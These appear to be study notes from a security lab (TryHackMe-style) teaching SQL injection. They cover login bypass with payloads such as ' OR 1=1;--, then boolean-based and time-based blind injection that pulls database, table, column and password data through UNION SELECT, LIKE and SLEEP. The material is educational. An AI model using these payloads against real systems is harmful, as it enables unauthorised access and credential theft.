# Authentication Bypass
Most login forms work by sending the username and password to the server, which constructs a query like:
```sql
SELECT * FROM users WHERE username='bob' AND password='secret123' LIMIT 1;
```
The application checks whether this query returns any rows. If it returns a row, the credentials are valid, and you're logged in. If it returns nothing, the login fails. The application never displays the actual query results. It either redirects you to a dashboard or shows "Invalid credentials."
## The attack
The key insight is that you don't need to know a valid username or password. You just need to make the query return at least one row. Consider what happens if you enter the username `' OR 1=1;--` and anything in the password field. The server constructs:
```sql
SELECT * FROM users WHERE username='' OR 1=1;--' AND password='anything' LIMIT 1;
```
## Targeting a specific user
```sql
SELECT * FROM users WHERE username='admin'--' AND password='anything' LIMIT 1;
```
## Variations
- `' OR 1=1;--` is classic bypass, works when the username is wrapped in single quotes.
- `' OR 1=1#` this uses `#` as the comment character (MySQL alternative).
- `" OR 1=1--` for queries that use double quotes around the input.
- Try both the username and password fields:  some applications only concatenate one of them into the query, so the vulnerable field may vary.
# Boolean-Based
In Boolean-Based Blind SQL Injection, the application returns a binary signal. Some kind of true/false difference. Maybe different page content, a response like `{"taken":true}` vs `{"taken":false}`, or a subtle change in the HTML. You use that two-state feedback to ask the database yes/no questions.

**The idea:** Imagine a username-check feature that tells you whether an account exists. `https://website.thm/checkuser?username=admin` returns `{"taken":true}` because admin is taken. `?username=admin123` returns `{"taken": false}` because that user does not exist.

If this input is injectable, the backend query probably looks like:
```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```
By injecting a `UNION SELECT` with a condition, you can ask the database arbitrary yes/no questions and read the answer from the true/false response.
- **Determine the number of columns.** Same idea as Union-Based. Try add columns until a true response is returned:
```sql
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2;--
admin123' UNION SELECT 1,2,3;--
```
- **Confirm injection.** Inject a condition that is always true:
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```
The `%` wildcard matches anything, so this should return true. If you see `{"taken":true}`, you know injection works.
- **Guess the database name, character by character.** Replace the wildcard with specific letters:
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```
False? Not 'a'. Try `b%`, `c%`, keep going. When the response flips to true, you have found the first letter. Then move to the second character: `sa%`, `sb%`, `sc%`, etc. and keep narrowing until you have the full name.
- **Get table names.** Same technique against `information_schema`:
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```
You could find a table named `users` for example.
- **Get column names.**
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE 'a%';--
```
You could find a column named `username` for example.
- **Extract the data.**
```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
```
You could find a username `admin` for example.
```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '1%';--
```
You could continue doing this to crack the password.
# Time-Based
Time-Based Blind SQL Injection is for when the application gives you absolutely nothing to work with visually. The page looks identical no matter what you inject. Same content, same status code, same headers. Your only signal is **how long the response takes**.

MySQL's `SLEEP()` function pauses query execution for a set number of seconds. Wrap a condition around it, and the database only pauses when the condition is true:
```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 's%';--
```
- **Determine the number of columns.** Same idea as Union-Based. Try `UNION SELECT SLEEP(5)` and add columns until you see a delay:
```sql
admin123' UNION SELECT SLEEP(5);--        -- no delay (wrong count)
admin123' UNION SELECT SLEEP(5),2;--      -- 5 second delay (2 columns!)
```
- **Enumerate data.**
```sql
admin123' UNION SELECT SLEEP(5),2 WHERE database() LIKE 'a%';--
```
- **Get table names**
```sql
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'db_name' AND table_name LIKE 'a%';--
```
You could find a table named `users` for example.
- **Get column names**
```sql
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_name = 'users' AND column_name LIKE 'a%';--
```
You could find a column named `username` for example.
- **Extract the data**
```sql
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username LIKE 'a%';--
```
You could find a username `admin` for example.
```sql
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '1%';--
```
You could continue doing this to crack the password.